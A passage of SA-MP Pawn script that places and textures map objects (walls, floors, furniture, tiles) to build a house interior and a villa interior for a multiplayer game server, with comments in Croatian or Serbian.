	housedjord = CreateDynamicObjectEx(19433,261.817,-1856.610,3338.111,0.000,180.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 10765, "airportgnd_sfse", "white", 0xFF000000);
	housedjord = CreateDynamicObjectEx(19381,244.609,-1846.128,3332.364,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 10765, "airportgnd_sfse", "white", 0x00000000);
	housedjord = CreateDynamicObjectEx(18980,268.430,-1861.463,3336.020,90.000,0.000,-90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14387, "dr_gsnew", "mp_gs_pooltiles", 0xFFFFFFFF);
	housedjord = CreateDynamicObjectEx(18980,256.426,-1873.610,3336.040,90.000,0.000,-180.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14387, "dr_gsnew", "mp_gs_pooltiles", 0xFFFFFFFF);
	housedjord = CreateDynamicObjectEx(19360,258.228,-1863.487,3335.791,0.000,90.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14387, "dr_gsnew", "mp_gs_pooltiles", 0x00000000);
	housedjord = CreateDynamicObjectEx(18980,260.135,-1874.164,3336.020,90.000,0.000,-180.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14387, "dr_gsnew", "mp_gs_pooltiles", 0xFFFFFFFF);
	housedjord = CreateDynamicObjectEx(18980,268.803,-1865.527,3336.020,90.000,0.000,-90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14387, "dr_gsnew", "mp_gs_pooltiles", 0xFFFFFFFF);
	housedjord = CreateDynamicObjectEx(1742,254.583,-1865.117,3334.234,0.000,0.000,-180.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 2, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(1744,254.828,-1865.194,3337.498,0.000,0.000,-180.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(1744,256.207,-1861.465,3335.972,0.000,0.000,-90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(1744,256.107,-1861.470,3335.781,0.000,0.000,-90.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(1744,257.057,-1861.151,3335.781,0.000,0.000,-180.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(1744,257.139,-1861.261,3335.972,0.000,0.000,-180.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	housedjord = CreateDynamicObjectEx(14842,258.768,-1864.985,3337.463,0.000,0.000,-180.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, -1, "none", "none", 0xFFFFFFFF);
	housedjord = CreateDynamicObjectEx(14842,259.018,-1863.466,3337.463,0.000,0.000,-180.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, -1, "none", "none", 0xFFFFFFFF);
	housedjord = CreateDynamicObjectEx(2134,258.189,-1858.737,3335.870,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(housedjord, 1, 10765, "airportgnd_sfse", "white", 0xFF808080);
	SetDynamicObjectMaterial(housedjord, 2, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(housedjord, 4, -1, "none", "none", 0xFF808080);
	housedjord = CreateDynamicObjectEx(2134,259.170,-1858.734,3335.870,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(housedjord, 1, 10765, "airportgnd_sfse", "white", 0xFF808080);
	SetDynamicObjectMaterial(housedjord, 2, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(housedjord, 4, -1, "none", "none", 0xFF808080);
	housedjord = CreateDynamicObjectEx(2134,257.208,-1858.740,3335.870,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(housedjord, 1, 10765, "airportgnd_sfse", "white", 0xFF808080);
	SetDynamicObjectMaterial(housedjord, 2, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(housedjord, 4, -1, "none", "none", 0xFF808080);
	housedjord = CreateDynamicObjectEx(2515,258.163,-1858.513,3337.043,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, -1, "none", "none", 0xFFFFFFFF);
	housedjord = CreateDynamicObjectEx(2255,258.153,-1858.769,3337.549,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 14581, "ab_mafiasuitea", "barbersmir1", 0x00000000);
	housedjord = CreateDynamicObjectEx(19327,256.037,-1854.004,3334.221,0.000,0.000,-180.000,300.000,300.000);
	SetDynamicObjectMaterialText(housedjord, 0, "LG", 140, "Ariel", 35, 1, 0xFFFF0000, 0x00000000, 1);
	housedjord = CreateDynamicObjectEx(19327,256.037,-1854.014,3334.161,0.000,0.000,-180.000,300.000,300.000);
	SetDynamicObjectMaterialText(housedjord, 0, "Freeze Tehnology", 140, "Ariel", 15, 1, 0xFF000000, 0x00000000, 1);
	housedjord = CreateDynamicObjectEx(2816,247.052,-1851.808,3332.593,0.000,0.000,-16.000,300.000,300.000);
	housedjord = CreateDynamicObjectEx(19581,254.016,-1853.082,3333.215,0.000,0.000,171.000,300.000,300.000);
	housedjord = CreateDynamicObjectEx(19582,254.065,-1852.629,3333.227,0.000,0.000,0.000,300.000,300.000);
	housedjord = CreateDynamicObjectEx(19591,250.562,-1846.330,3333.943,0.000,0.000,0.000,300.000,300.000);
	housedjord = CreateDynamicObjectEx(2267,252.472,-1846.354,3333.998,0.000,0.000,0.000,300.000,300.000);
	housedjord = CreateDynamicObjectEx(2263,255.563,-1846.809,3333.819,0.000,0.000,0.000,300.000,300.000);
	housedjord = CreateDynamicObjectEx(2264,261.605,-1847.535,3334.929,0.000,0.000,-90.000,300.000,300.000);
	housedjord = CreateDynamicObjectEx(2254,242.399,-1848.129,3334.271,0.000,0.000,90.000,300.000,300.000);
	housedjord = CreateDynamicObjectEx(2251,242.705,-1846.599,3333.202,0.000,0.000,90.000,300.000,300.000);
	housedjord = CreateDynamicObjectEx(2241,259.855,-1848.608,3332.802,0.000,0.000,90.000,300.000,300.000);
	housedjord = CreateDynamicObjectEx(2853,258.340,-1852.347,3336.364,0.000,0.000,0.000,300.000,300.000);
	housedjord = CreateDynamicObjectEx(2828,253.510,-1852.215,3336.367,0.000,0.000,-164.000,300.000,300.000);
	housedjord = CreateDynamicObjectEx(19632,261.068,-1856.286,3336.375,0.000,0.000,0.000,300.000,300.000);
	housedjord = CreateDynamicObjectEx(19632,261.082,-1856.608,3336.375,0.000,0.000,0.000,300.000,300.000);
	housedjord = CreateDynamicObjectEx(19632,261.095,-1856.448,3336.495,0.000,0.000,0.000,300.000,300.000);
	housedjord = CreateDynamicObjectEx(2406,257.188,-1857.926,3337.108,-6.000,0.000,-180.000,300.000,300.000);
	housedjord = CreateDynamicObjectEx(2405,256.495,-1857.886,3337.108,-6.000,0.000,-180.000,300.000,300.000);
	housedjord = CreateDynamicObjectEx(2286,256.009,-1851.839,3337.490,0.000,0.000,0.000,300.000,300.000);
	housedjord = CreateDynamicObjectEx(10444,263.638,-1876.892,3335.997,0.000,0.000,0.000,300.000,300.000);
	housedjord = CreateDynamicObjectEx(10444,263.638,-1876.892,3336.077,0.000,0.000,0.000,300.000,300.000);
	housedjord = CreateDynamicObjectEx(10444,263.638,-1876.892,3336.116,0.000,0.000,0.000,300.000,300.000);
	housedjord = CreateDynamicObjectEx(2384,254.638,-1864.901,3336.001,0.000,0.000,0.000,300.000,300.000);
	housedjord = CreateDynamicObjectEx(2384,254.009,-1864.902,3336.372,0.000,0.000,0.000,300.000,300.000);
	housedjord = CreateDynamicObjectEx(2870,254.472,-1864.893,3337.837,0.000,0.000,0.000,300.000,300.000);
	housedjord = CreateDynamicObjectEx(2749,256.519,-1864.418,3336.537,0.000,0.000,0.000,300.000,300.000);
	housedjord = CreateDynamicObjectEx(2751,256.376,-1864.375,3336.582,0.000,0.000,0.000,300.000,300.000);
	housedjord = CreateDynamicObjectEx(2752,256.497,-1864.195,3336.582,0.000,0.000,0.000,300.000,300.000);
	housedjord = CreateDynamicObjectEx(2741,259.139,-1858.329,3337.283,0.000,0.000,0.000,300.000,300.000);
	housedjord = CreateDynamicObjectEx(2751,257.153,-1858.631,3336.954,0.000,0.000,0.000,300.000,300.000);
	housedjord = CreateDynamicObjectEx(2752,257.323,-1858.573,3336.954,0.000,0.000,0.000,300.000,300.000);
	housedjord = CreateDynamicObjectEx(2239,253.328,-1858.657,3335.869,0.000,0.000,52.000,300.000,300.000);

	housedjord = CreateDynamicObjectEx(19377,258.156,-1856.436,3339.202,0.000,90.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 19377, "all_walls","la_carp3",0xFF676767);
	housedjord = CreateDynamicObjectEx(19377,258.0100, -1866.0670, 3339.2019,0.000,90.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 19377, "all_walls","la_carp3",0xFF676767);
	housedjord = CreateDynamicObjectEx(19377,240.442,-1849.355,3335.705,0.000,90.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 19377, "all_walls","la_carp3",0xFF676767);
	housedjord = CreateDynamicObjectEx(19377,250.931,-1849.405,3335.705,0.000,90.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 19377, "all_walls","la_carp3",0xFF676767);
	housedjord = CreateDynamicObjectEx(19377,261.553,-1846.955,3339.202,0.000,90.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 19377, "all_walls","la_carp3",0xFF676767);
	housedjord = CreateDynamicObjectEx(19377,255.114,-1855.226,3335.579,0.000,90.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(housedjord, 0, 19377, "all_walls","la_carp3",0xFF676767);
	//dodatno
	CreateDynamicObject(1734, 247.06360, -1851.35315, 3335.61377,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1734, 247.06360, -1848.02112, 3335.61377,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1734, 253.53160, -1848.02112, 3335.61377,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1734, 253.53160, -1852.43115, 3335.61377,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1734, 259.83951, -1847.82642, 3339.11060,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1734, 256.49060, -1854.67651, 3339.11060,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19828, 258.21829, -1851.82349, 3336.76953,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19828, 253.71030, -1851.82349, 3336.76953,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19828, 255.81310, -1858.00000, 3337.08911,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19828, 255.51910, -1858.00000, 3337.08911,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19828, 260.07211, -1851.84363, 3337.20923,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19828, 245.43500, -1852.71692, 3333.67334,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1731, 261.92581, -1846.75513, 3335.39355,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1731, 261.92581, -1848.42114, 3336.27539,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1731, 261.92581, -1850.57715, 3337.74561,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1731, 257.32101, -1846.91040, 3335.67822,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1731, 257.32101, -1848.82129, 3335.67822,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1731, 257.30881, -1851.97156, 3337.70703,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1731, 254.66280, -1851.97156, 3337.70703,   0.00000, 0.00000, 90.00000);
    CreateDynamicObject(1734, 257.53409, -1862.63196, 3339.11011,   0.00000, 0.00000, 0.00000);
	
	

	//------------------------|| Interior VILA ||-------------------------
	new VKUCAINTPOD[5];
    VKUCAINTPOD[0] = CreateDynamicObject(18981,1693.6309, 3850.4182, 5.8959,0.0000, 90.0000, 0.0600);
    VKUCAINTPOD[1] = CreateDynamicObject(18763,1687.2627, 3843.7993, 4.5741,0.0000, 0.0000, 0.000);
    VKUCAINTPOD[2] = CreateDynamicObject(18981,1673.2634, 3835.3718, 6.5737,0.0000, 90.0000, 0.0000);
    VKUCAINTPOD[3] = CreateDynamicObject(18765,1676.4436, 3852.8704, 4.5710,0.0000, 0.0000, 0.0000);
    VKUCAINTPOD[4] = CreateDynamicObject(18981,1693.6309, 3875.4146, 5.8959,0.0000, 90.0000, 0.0000);
    SetDynamicObjectMaterial(VKUCAINTPOD[0],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTPOD[1],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTPOD[2],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTPOD[3],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);
    SetDynamicObjectMaterial(VKUCAINTPOD[4],0, 14771, "int_brothelint3", "GB_nastybar12", 0xFF6E6E6E);

	new VKUCAINTPLAFON[5];
    VKUCAINTPLAFON[0] = CreateDynamicObject(18981,1668.6329, 3850.4182, 10.6268,0.0000, 90.0000, 0.0000);
	VKUCAINTPLAFON[1] = CreateDynamicObject(18981,1693.6309, 3850.4182, 10.6268,0.0000, 90.0000, 0.0000);
    VKUCAINTPLAFON[2] = CreateDynamicObject(18981,1693.6309, 3875.4146, 10.6268,0.0000, 90.0000, 0.0000);
    SetDynamicObjectMaterial(VKUCAINTPLAFON[0],0, 11301, "carshow_sfse", "ws_officy_ceiling", 0xFF727272);
    SetDynamicObjectMaterial(VKUCAINTPLAFON[1],0, 11301, "carshow_sfse", "ws_officy_ceiling", 0xFF727272);
    SetDynamicObjectMaterial(VKUCAINTPLAFON[2],0, 11301, "carshow_sfse", "ws_officy_ceiling", 0xFF727272);

	new VKUCAWCPOD = CreateDynamicObject(19376, 1687.58679, 3852.62646, 6.30840,   0.00000, 90.00000, 0.00000);
    SetDynamicObjectMaterial(VKUCAWCPOD,0, 14387, "dr_gsnew", "mp_gs_pooltiles", 0xFF747474);
	new VKUCAKUHINJAPOD = CreateDynamicObject(19376, 1688.93079, 3862.89844, 6.30840,   0.00000, 90.00000, 0.00000);
	SetDynamicObjectMaterial(VKUCAKUHINJAPOD,0, 14387, "dr_gsnew", "mp_gs_pooltiles", 0xFF747474);
	new VKUCAZIDOVI[36];
	VKUCAZIDOVI[0] = CreateDynamicObject(19377,1690.0310, 3843.1780, 4.8959,0.0000, 0.0000, 90.0000);
    VKUCAZIDOVI[1] = CreateDynamicObject(19377,1694.7607, 3838.4478, 4.8959,0.0000, 0.0000, 0.0000);
    VKUCAZIDOVI[2] = CreateDynamicObject(19377,1691.8120, 3837.9875, 4.8959,0.0000, 0.0000, 90.0000);
	VKUCAZIDOVI[3] = CreateDynamicObject(19377,1701.4459, 3837.9875, 4.8959,0.0000, 0.0000, 90.0000);
	VKUCAZIDOVI[4] = CreateDynamicObject(19377,1706.1761, 3836.3323, 4.8959,0.0000, 0.0000, 0.0000);
	VKUCAZIDOVI[5] = CreateDynamicObject(19377,1706.1761, 3853.9863, 4.8959,0.0000, 0.0000, 0.0000);
	VKUCAZIDOVI[6] = CreateDynamicObject(19377,1701.4196, 3862.5015, 4.8959,0.0000, 0.0000, 90.0000);
	VKUCAZIDOVI[7] = CreateDynamicObject(19377,1698.9453, 3862.5032, 4.8959,0.0000, 0.0000, 90.0000);
	//kuhinja
	VKUCAZIDOVI[8] = CreateDynamicObject(19377,1694.2100, 3867.2329, 4.8959,0.0000, 0.0000, 0.0000);
	VKUCAZIDOVI[9] = CreateDynamicObject(19377,1690.1477, 3864.8115, 4.8959,0.0000, 0.0000, 90.0000);
	VKUCAZIDOVI[10] = CreateDynamicObject(19377,1686.8130, 3862.9187, 4.8959,0.0000, 0.0000, 0.0000);
	VKUCAZIDOVI[11] = CreateDynamicObject(19377,1690.1475, 3857.3267, 4.8959,0.0000, 0.0000, 90.0000);
	VKUCAZIDOVI[12] = CreateDynamicObject(19377,1694.9060, 3852.5691, 2.1790,0.0000, 0.0000, 0.0000);
	VKUCAZIDOVI[13] = CreateDynamicObject(19377,1694.9060, 3852.5691, 14.2780,0.0000, 0.0000, 0.0000);
	//kod akvarija
	VKUCAZIDOVI[14] = CreateDynamicObject(19430,1694.1874, 3847.8379, 5.6798,0.0000, 0.0000, 90.0000);
	VKUCAZIDOVI[15] = CreateDynamicObject(19430,1694.1874, 3847.8379, 10.7768,0.0000, 0.0000, 90.0000);
	VKUCAZIDOVI[16] = CreateDynamicObject(19430,1692.5822, 3847.8379, 5.2153,0.0000, 0.0000, 90.0000);
	VKUCAZIDOVI[17] = CreateDynamicObject(19430,1692.5822, 3847.8379, 8.7153,0.0000, 0.0000, 90.0000);
	VKUCAZIDOVI[18] = CreateDynamicObject(19430,1694.9036, 3856.6492, 4.9273,0.0000, 0.0000, 0.0000);
	VKUCAZIDOVI[19] = CreateDynamicObject(19430,1694.9036, 3856.6492, 8.4073,0.0000, 0.0000, 0.0000);
	//spavaca
	VKUCAZIDOVI[20] = CreateDynamicObject(19377,1684.8523, 3847.8379, 4.8959,0.0000, 0.0000, 90.0000);
	VKUCAZIDOVI[21] = CreateDynamicObject(19377,1680.3970, 3843.1780, 4.8959,0.0000, 0.0000, 90.0000);
	VKUCAZIDOVI[22] = CreateDynamicObject(19377,1683.0315, 3852.2661, 4.8959,0.0000, 0.0000, 0.0000);
	VKUCAZIDOVI[23] = CreateDynamicObject(19377,1683.0315, 3840.7131, 4.8959,0.0000, 0.0000, 0.0000);
	//wc
	VKUCAZIDOVI[24] = CreateDynamicObject(19379,1684.8503, 3847.8398, 4.8959,0.0000, 0.0000, 90.0000);
	VKUCAZIDOVI[25] = CreateDynamicObject(19379,1692.9209, 3852.5754, 4.8959,0.0000, 0.0000, 0.0000);
	VKUCAZIDOVI[26] = CreateDynamicObject(19379,1690.1475, 3857.2847, 4.8959,0.0000, 0.0000, 90.0000);
	VKUCAZIDOVI[27] = CreateDynamicObject(19379,1686.7979, 3854.2458, 4.8959,0.0000, 0.0000, 0.0000);
	//akvarij unutra
	VKUCAZIDOVI[28] = CreateDynamicObject(19377,1693.3008, 3852.5679, 4.0116,0.0000, 0.0000, 0.0000);
	VKUCAZIDOVI[29] = CreateDynamicObject(19430,1694.1876, 3855.9338, 8.1273,0.0000, 0.0000, 90.0000);
	//pod akvarija
	VKUCAZIDOVI[30] = CreateDynamicObject(19429,1694.1726, 3855.4060, 7.3449,0.0000, 90.0000, 90.0000);
	VKUCAZIDOVI[31] = CreateDynamicObject(19429,1694.1726, 3853.0330, 7.3470,0.0000, 90.0000, 90.0000);
	VKUCAZIDOVI[32] = CreateDynamicObject(19429,1694.1726, 3849.5344, 7.3470,0.0000, 90.0000, 90.0000);
	VKUCAZIDOVI[33] = CreateDynamicObject(19429,1694.1726, 3855.4060, 9.1760,0.0000, 90.0000, 90.0000);
	VKUCAZIDOVI[34] = CreateDynamicObject(19429,1694.1726, 3853.0330, 9.1716,0.0000, 90.0000, 90.0000);
	VKUCAZIDOVI[35] = CreateDynamicObject(19429,1694.1726, 3849.5344, 9.1716,0.0000, 90.0000, 90.0000);

    SetDynamicObjectMaterial(VKUCAZIDOVI[0],0, 18031, "cj_exp", "mp_cloth_wall", 0xFFFFFFCC);
    SetDynamicObjectMaterial(VKUCAZIDOVI[1],0, 18031, "cj_exp", "mp_cloth_wall", 0xFFFFFFCC);
    SetDynamicObjectMaterial(VKUCAZIDOVI[2],0, 18031, "cj_exp", "mp_cloth_wall", 0xFFFFFFCC);
    SetDynamicObjectMaterial(VKUCAZIDOVI[3],0, 18031, "cj_exp", "mp_cloth_wall", 0xFFFFFFCC);
    SetDynamicObjectMaterial(VKUCAZIDOVI[4],0, 18031, "cj_exp", "mp_cloth_wall", 0xFFFFFFCC);
    SetDynamicObjectMaterial(VKUCAZIDOVI[5],0, 18031, "cj_exp", "mp_cloth_wall", 0xFFFFFFCC);
    SetDynamicObjectMaterial(VKUCAZIDOVI[6],0, 18031, "cj_exp", "mp_cloth_wall", 0xFFFFFFCC);
    SetDynamicObjectMaterial(VKUCAZIDOVI[7],0, 18031, "cj_exp", "mp_cloth_wall", 0xFFFFFFCC);
    SetDynamicObjectMaterial(VKUCAZIDOVI[8],0, 14387, "dr_gsnew", "mp_gs_pooltiles", 0x00000000);
    SetDynamicObjectMaterial(VKUCAZIDOVI[9],0, 14387, "dr_gsnew", "mp_gs_pooltiles", 0x00000000);
    SetDynamicObjectMaterial(VKUCAZIDOVI[10],0, 14387, "dr_gsnew", "mp_gs_pooltiles", 0x00000000);
    SetDynamicObjectMaterial(VKUCAZIDOVI[11],0, 14387, "dr_gsnew", "mp_gs_pooltiles", 0x00000000);
    SetDynamicObjectMaterial(VKUCAZIDOVI[12],0, 18031, "cj_exp", "mp_cloth_wall", 0xFFFFFFCC);
    SetDynamicObjectMaterial(VKUCAZIDOVI[13],0, 18031, "cj_exp", "mp_cloth_wall", 0xFFFFFFCC);
    SetDynamicObjectMaterial(VKUCAZIDOVI[14],0, 18031, "cj_exp", "mp_cloth_wall", 0xFFFFFFCC);
    SetDynamicObjectMaterial(VKUCAZIDOVI[15],0, 18031, "cj_exp", "mp_cloth_wall", 0xFFFFFFCC);
    SetDynamicObjectMaterial(VKUCAZIDOVI[16],0, 18031, "cj_exp", "mp_cloth_wall", 0xFFFFFFCC);
    SetDynamicObjectMaterial(VKUCAZIDOVI[17],0, 18031, "cj_exp", "mp_cloth_wall", 0xFFFFFFCC);
    SetDynamicObjectMaterial(VKUCAZIDOVI[18],0, 18031, "cj_exp", "mp_cloth_wall", 0xFFFFFFCC);
    SetDynamicObjectMaterial(VKUCAZIDOVI[19],0, 18031, "cj_exp", "mp_cloth_wall", 0xFFFFFFCC);
    SetDynamicObjectMaterial(VKUCAZIDOVI[20],0, 18031, "cj_exp", "mp_cloth_wall", 0xFFFFFFCC);
    SetDynamicObjectMaterial(VKUCAZIDOVI[21],0, 18031, "cj_exp", "mp_cloth_wall", 0xFFFFFFCC);
    SetDynamicObjectMaterial(VKUCAZIDOVI[22],0, 18031, "cj_exp", "mp_cloth_wall", 0xFFFFFFCC);
    SetDynamicObjectMaterial(VKUCAZIDOVI[23],0, 18031, "cj_exp", "mp_cloth_wall", 0xFFFFFFCC);
    SetDynamicObjectMaterial(VKUCAZIDOVI[24],0, 14387, "dr_gsnew", "mp_gs_pooltiles", 0x00000000);
    SetDynamicObjectMaterial(VKUCAZIDOVI[25],0, 14387, "dr_gsnew", "mp_gs_pooltiles", 0x00000000);
    SetDynamicObjectMaterial(VKUCAZIDOVI[26],0, 14387, "dr_gsnew", "mp_gs_pooltiles", 0x00000000);
    SetDynamicObjectMaterial(VKUCAZIDOVI[27],0, 14387, "dr_gsnew", "mp_gs_pooltiles", 0x00000000);
    SetDynamicObjectMaterial(VKUCAZIDOVI[28],0, 19377, "all_walls","la_carp3",0xFF676767);
    SetDynamicObjectMaterial(VKUCAZIDOVI[29],0, 19377, "all_walls","la_carp3",0xFF676767);
	SetDynamicObjectMaterial(VKUCAZIDOVI[30],0, 3820, "boxhses_sfsx", "stonewall_la", 0xFFFFFFFF);
	SetDynamicObjectMaterial(VKUCAZIDOVI[31],0, 3820, "boxhses_sfsx", "stonewall_la", 0xFFFFFFFF);
	SetDynamicObjectMaterial(VKUCAZIDOVI[32],0, 3820, "boxhses_sfsx", "stonewall_la", 0xFFFFFFFF);
	SetDynamicObjectMaterial(VKUCAZIDOVI[33],0, 3820, "boxhses_sfsx", "stonewall_la", 0xFFFFFFFF);
	SetDynamicObjectMaterial(VKUCAZIDOVI[34],0, 3820, "boxhses_sfsx", "stonewall_la", 0xFFFFFFFF);
	SetDynamicObjectMaterial(VKUCAZIDOVI[35],0, 3820, "boxhses_sfsx", "stonewall_la", 0xFFFFFFFF);

	new VKUCAINTTAMNIZID[44];
	VKUCAINTTAMNIZID[0] = CreateDynamicObject(19430,1687.5553, 3848.7244, 8.4603,0.0000, 0.0000, 0.0000);
	VKUCAINTTAMNIZID[1] = CreateDynamicObject(19430,1687.5553, 3848.7244, 4.9663,0.0000, 0.0000, 0.0000);
    VKUCAINTTAMNIZID[2] = CreateDynamicObject(19430,1686.8379, 3849.4390, 8.4603,0.0000, 0.0000, 90.0000);
	VKUCAINTTAMNIZID[3] = CreateDynamicObject(19430,1687.5553, 3857.3276, 8.6633,0.0000, 0.0000, 0.0000);
	VKUCAINTTAMNIZID[4] = CreateDynamicObject(19430,1687.5553, 3857.3276, 5.1913,0.0000, 0.0000, 0.0000);
	VKUCAINTTAMNIZID[5] = CreateDynamicObject(19377,1682.8230, 3856.6128, 4.8959,0.0000, 0.0000, 90.0000);
	VKUCAINTTAMNIZID[6] = CreateDynamicObject(19377,1682.8230, 3858.0435, 4.6342,0.0000, 0.0000, 90.0000);
	VKUCAINTTAMNIZID[7] = CreateDynamicObject(19377,1682.8230, 3864.0571, 4.8959,0.0000, 0.0000, 90.0000);
	VKUCAINTTAMNIZID[8] = CreateDynamicObject(19377,1687.5553, 3868.7900, 4.8959,0.0000, 0.0000, 0.0000);
    VKUCAINTTAMNIZID[9] = CreateDynamicObject(18980,1686.9229, 3860.3909, 10.1679,0.0000, 90.0000, 90.0000);
	//kod ulaza dekoracija
	VKUCAINTTAMNIZID[10] = CreateDynamicObject(19378, 1689.63232, 3838.44751, 6.60390,   0.00000, 90.00000, 0.00000);
	VKUCAINTTAMNIZID[11] = CreateDynamicObject(19378, 1689.63232, 3838.44751, 7.02790,   0.00000, 90.00000, 0.00000);
	VKUCAINTTAMNIZID[12] = CreateDynamicObject(19378, 1689.63232, 3838.44751, 7.45190,   0.00000, 90.00000, 0.00000);
	VKUCAINTTAMNIZID[13] = CreateDynamicObject(19378, 1689.63232, 3838.44751, 7.87590,   0.00000, 90.00000, 0.00000);
	VKUCAINTTAMNIZID[14] = CreateDynamicObject(19378, 1689.63232, 3838.44556, 8.29990,   0.00000, 90.00000, 0.00000);
	VKUCAINTTAMNIZID[15] = CreateDynamicObject(19378, 1689.63232, 3838.44556, 8.72390,   0.00000, 90.00000, 0.00000);
	VKUCAINTTAMNIZID[16] = CreateDynamicObject(19378, 1689.63232, 3838.44751, 9.14790,   0.00000, 90.00000, 0.00000);
	VKUCAINTTAMNIZID[17] = CreateDynamicObject(19378, 1689.63232, 3838.44751, 9.57190,   0.00000, 90.00000, 0.00000);
	VKUCAINTTAMNIZID[18] = CreateDynamicObject(19378, 1689.63232, 3838.44751, 9.99590,   0.00000, 90.00000, 0.00000);
	VKUCAINTTAMNIZID[19] = CreateDynamicObject(19458, 1693.13184, 3838.48218, 6.60190,   0.00000, 90.00000, 0.00000);
	VKUCAINTTAMNIZID[20] = CreateDynamicObject(19458, 1693.13184, 3838.48218, 7.02590,   0.00000, 90.00000, 0.00000);
	VKUCAINTTAMNIZID[21] = CreateDynamicObject(19458, 1693.13184, 3838.48218, 7.44990,   0.00000, 90.00000, 0.00000);
	VKUCAINTTAMNIZID[22] = CreateDynamicObject(19458, 1693.13184, 3838.48218, 7.87390,   0.00000, 90.00000, 0.00000);
	VKUCAINTTAMNIZID[23] = CreateDynamicObject(19458, 1693.13184, 3838.48218, 8.29790,   0.00000, 90.00000, 0.00000);
	VKUCAINTTAMNIZID[24] = CreateDynamicObject(19458, 1693.13184, 3838.48218, 8.72190,   0.00000, 90.00000, 0.00000);
	VKUCAINTTAMNIZID[25] = CreateDynamicObject(19458, 1693.13184, 3838.48218, 9.14590,   0.00000, 90.00000, 0.00000);
	VKUCAINTTAMNIZID[26] = CreateDynamicObject(19458, 1693.13184, 3838.48218, 9.56990,   0.00000, 90.00000, 0.00000);
	VKUCAINTTAMNIZID[27] = CreateDynamicObject(19458, 1693.13184, 3838.48218, 9.99390,   0.00000, 90.00000, 0.00000);
	VKUCAINTTAMNIZID[28] = CreateDynamicObject(19458, 1690.86389, 3838.48413, 8.29790,   0.00000, 90.00000, 0.00000);
	VKUCAINTTAMNIZID[29] = CreateDynamicObject(19458, 1690.86389, 3838.48413, 8.72190,   0.00000, 90.00000, 0.00000);
	VKUCAINTTAMNIZID[30] = CreateDynamicObject(19458, 1690.86389, 3838.48413, 9.14590,   0.00000, 90.00000, 0.00000);
	VKUCAINTTAMNIZID[31] = CreateDynamicObject(19458, 1690.86389, 3838.48413, 9.56990,   0.00000, 90.00000, 0.00000);
